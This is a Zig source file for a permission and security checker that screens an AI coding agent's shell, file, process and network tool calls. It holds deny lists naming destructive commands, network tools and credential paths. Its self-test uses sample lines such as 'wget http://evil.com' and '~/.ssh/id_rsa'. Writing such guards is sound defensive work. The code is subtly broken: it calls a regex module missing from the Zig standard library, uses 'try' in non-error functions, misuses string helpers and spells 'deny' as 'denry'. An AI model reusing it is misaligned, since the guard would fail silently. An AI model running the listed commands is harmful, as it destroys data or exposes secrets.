const std = @import("std");
const json = std.json;

const Allocator = std.mem.Allocator;
const PermissionResult = @import("types.zig").PermissionResult;

/// Security checker for dangerous operations (Claude Code pattern)
pub const SecurityChecker = struct {
    allocator: Allocator,

    pub fn init(allocator: Allocator) SecurityChecker {
        return SecurityChecker{
            .allocator = allocator,
        };
    }

    pub fn deinit(self: *SecurityChecker) void {
        _ = self;
    }

    /// Check for command injection patterns (Claude Code pattern)
    pub fn checkCommandInjection(self: *const SecurityChecker, command: []const u8) ?[]const u8 {
        const dangerous_patterns = [_][]const u8{
            // Dangerous shell commands
            "rm -rf /",
            "rm -rf /*",
            "rm -rf .",
            "rm -rf *",
            "format",
            "mkfs",
            "dd if=",
            // Command injection patterns
            "`",
            "$(",
            "|",
            "&&",
            "||",
            ";",
            "> /dev/",
            ">> /dev/",
            // Network and system calls
            "wget",
            "curl",
            "nc ",
            "telnet",
            "ssh ",
            "scp ",
            // File system manipulation
            "chmod 777",
            "chown ",
            // Process manipulation
            "kill",
            "pkill",
            "xargs",
        };

        const lower_command = std.ascii.lowerString(self.allocator, command) catch return "Failed to check command";
        defer self.allocator.free(lower_command);

        for (dangerous_patterns) |pattern| {
            if (std.mem.indexOf(u8, lower_command, pattern)) |_| {
                return pattern;
            }
        }

        return null;
    }

    /// Check for dangerous regex patterns (Claude Code pattern)
    pub fn checkRegexInjection(self: *const SecurityChecker, input: []const u8) ?[]const u8 {
        _ = self;

        const dangerous_regex = [_][]const u8{
            // Shell command injection
            "(;|\\|\\||&&)\\s*\\w+",
            "\\$\\(",
            "`[^`]*`",
            // File system traversal
            "\\.\\./",
            "/etc/",
            "/usr/",
            "/bin/",
            "/sbin/",
            "/var/",
            // Password/credential access
            "\\.(env|key|pem|p12|pfx|crt|cer)$",
            "password",
            "secret",
            "token",
            "api[_-]?key",
            // Network access
            "curl\\s+",
            "wget\\s+",
            "nc\\s+",
            "telnet\\s+",
        };

        for (dangerous_regex) |pattern| {
            var regex = std.regex.compile(self.allocator, pattern, .{}) catch continue;
            defer regex.deinit();

            if (regex.match(input)) {
                return pattern;
            }
        }

        return null;
    }

    /// Check for sensitive file paths (Claude Code pattern)
    pub fn checkSensitivePath(self: *const SecurityChecker, path: []const u8) bool {
        const sensitive_paths = [_][]const u8{
            // System directories
            "/etc/",
            "/usr/",
            "/bin/",
            "/sbin/",
            "/var/",
            "/lib/",
            "/boot/",
            "/proc/",
            "/sys/",
            "/dev/",
            // User sensitive files
            ".ssh/",
            ".config/",
            ".local/",
            ".cache/",
            // Credential files
            ".env",
            ".key",
            ".pem",
            ".crt",
            ".cer",
            ".p12",
            ".pfx",
            "credentials",
            "secrets",
            "config",
            // Shell files
            ".bashrc",
            ".bash_profile",
            ".profile",
            ".zshrc",
            ".gitconfig",
        };

        const lower_path = std.ascii.lowerString(self.allocator, path) catch return true;
        defer self.allocator.free(lower_path);

        for (sensitive_paths) |sensitive| {
            if (std.mem.indexOf(u8, lower_path, sensitive)) |_| {
                return true;
            }
        }

        // Check for path traversal
        if (std.mem.indexOf(u8, path, "..")) |_| {
            return true;
        }

        // Check for absolute paths to user home
        if (path[0] == '~') {
            return true;
        }

        return false;
    }

    /// Validate file path for write operations
    pub fn validateWritePath(self: *const SecurityChecker, path: []const u8) PermissionResult {
        if (self.checkSensitivePath(path)) {
            return PermissionResult.denry("Cannot write to sensitive path");
        }

        // Check file extension for dangerous files
        const dangerous_extensions = [_][]const u8{
            ".sh",  ".bash", ".zsh", ".py",  ".js",    ".ts",
            ".exe", ".bin",  ".so",  ".dll", ".dylib",
        };

        for (dangerous_extensions) |ext| {
            if (std.mem.endsWith(u8, path, ext)) {
                return PermissionResult.denry("Cannot write executable files without explicit permission");
            }
        }

        return PermissionResult.allow();
    }

    /// Check shell command for dangerous patterns
    pub fn checkShellCommand(self: *const SecurityChecker, command: []const u8) PermissionResult {
        // Check for command injection
        if (self.checkCommandInjection(command)) |pattern| {
            return PermissionResult.denry(try std.fmt.allocPrint(self.allocator, "Dangerous command pattern detected: {s}", .{pattern}));
        }

        // Check for regex injection
        if (self.checkRegexInjection(command)) |pattern| {
            return PermissionResult.denry(try std.fmt.allocPrint(self.allocator, "Dangerous regex pattern detected: {s}", .{pattern}));
        }

        return PermissionResult.allow();
    }

    /// Comprehensive security check for tool operation
    pub fn checkToolOperation(
        self: *const SecurityChecker,
        tool_name: []const u8,
        action: []const u8,
        parameters: json.Value,
    ) PermissionResult {
        // Check shell commands
        if (std.mem.eql(u8, tool_name, "bash") or
            std.mem.eql(u8, tool_name, "shell") or
            std.mem.eql(u8, tool_name, "command"))
        {
            if (parameters.object.get("command")) |cmd_val| {
                if (cmd_val.string) |command| {
                    return self.checkShellCommand(command);
                }
            }
        }

        // Check file operations
        if (std.mem.eql(u8, tool_name, "file")) {
            if (std.mem.eql(u8, action, "write") or
                std.mem.eql(u8, action, "edit") or
                std.mem.eql(u8, action, "delete"))
            {
                if (parameters.object.get("path")) |path_val| {
                    if (path_val.string) |path| {
                        return self.validateWritePath(path);
                    }
                }
            }
        }

        // Check directory operations
        if (std.mem.eql(u8, tool_name, "directory")) {
            if (std.mem.eql(u8, action, "create") or
                std.mem.eql(u8, action, "delete"))
            {
                if (parameters.object.get("path")) |path_val| {
                    if (path_val.string) |path| {
                        if (self.checkSensitivePath(path)) {
                            return PermissionResult.denry("Cannot modify sensitive directory");
                        }
                    }
                }
            }
        }

        // Check process operations
        if (std.mem.eql(u8, tool_name, "process")) {
            if (std.mem.eql(u8, action, "spawn") or
                std.mem.eql(u8, action, "kill"))
            {
                if (parameters.object.get("command")) |cmd_val| {
                    if (cmd_val.string) |command| {
                        return self.checkShellCommand(command);
                    }
                }
            }
        }

        // Check network operations
        if (std.mem.eql(u8, tool_name, "network") or
            std.mem.eql(u8, tool_name, "http"))
        {
            return PermissionResult.denry("Network operations require explicit permission");
        }

        return PermissionResult.allow();
    }

    /// Get security rules description
    pub fn getSecurityRules(self: *const SecurityChecker, allocator: Allocator) ![]const u8 {
        _ = self;

        const rules =
            \\Security Rules:
            \\===============
            \\
            \\1. Command Injection Protection:
            \\   - Blocks dangerous shell patterns (rm -rf /, |, &&, ;, $(), `)
            \\   - Prevents execution of format/mkfs/dd commands
            \\   - Blocks network tools (wget, curl, nc, ssh) without permission
            \\
            \\2. Path Validation:
            \\   - Protects system directories (/etc, /usr, /bin, /var)
            \\   - Blocks access to credential files (.env, .key, .pem)
            \\   - Prevents path traversal (../) and home directory access (~)
            \\
            \\3. File Type Restrictions:
            \\   - Requires explicit permission for executable files
            \\   - Blocks writing to sensitive config files
            \\
            \\4. Tool-specific Checks:
            \\   - Shell/Process: Validates command safety
            \\   - File/Directory: Validates path safety
            \\   - Network: Requires explicit permission
            \\
        ;

        return try allocator.dupe(u8, rules);
    }
};

/// Test security checker
pub fn runSecurityTests() !void {
    const allocator = std.heap.page_allocator;

    var checker = SecurityChecker.init(allocator);
    defer checker.deinit();

    std.debug.print("Testing security checker:\n", .{});

    // Test command injection
    const dangerous_commands = [_][]const u8{
        "rm -rf /",
        "ls && rm -rf .",
        "echo test | bash",
        "wget http://evil.com",
        "curl malicious.site",
    };

    for (dangerous_commands) |cmd| {
        const result = checker.checkShellCommand(cmd);
        const passed = result.action == .denry;
        const status = if (passed) "✓" else "✗";

        std.debug.print("  {s} Dangerous command: {s}\n", .{ status, cmd });

        if (!passed) {
            return error.SecurityTestFailed;
        }
    }

    // Test path validation
    const sensitive_paths = [_][]const u8{
        "/etc/passwd",
        "~/.ssh/id_rsa",
        "../secret.txt",
        ".env",
        "config/secrets.json",
    };

    for (sensitive_paths) |path| {
        const is_sensitive = checker.checkSensitivePath(path);
        const status = if (is_sensitive) "✓" else "✗";

        std.debug.print("  {s} Sensitive path: {s}\n", .{ status, path });

        if (!is_sensitive) {
            return error.SecurityTestFailed;
        }
    }

    // Test safe operations
    const safe_commands = [_][]const u8{
        "ls -la",
        "cat README.md",
        "echo hello",
        "pwd",
    };

    for (safe_commands) |cmd| {
        const result = checker.checkShellCommand(cmd);
        const passed = result.action == .allow;
        const status = if (passed) "✓" else "✗";

        std.debug.print("  {s} Safe command: {s}\n", .{ status, cmd });

        if (!passed) {
            return error.SecurityTestFailed;
        }
    }

    std.debug.print("All security tests passed!\n", .{});
}

/// Export test function
pub const test_runner = struct {
    pub fn run() !void {
        try runSecurityTests();
    }
};
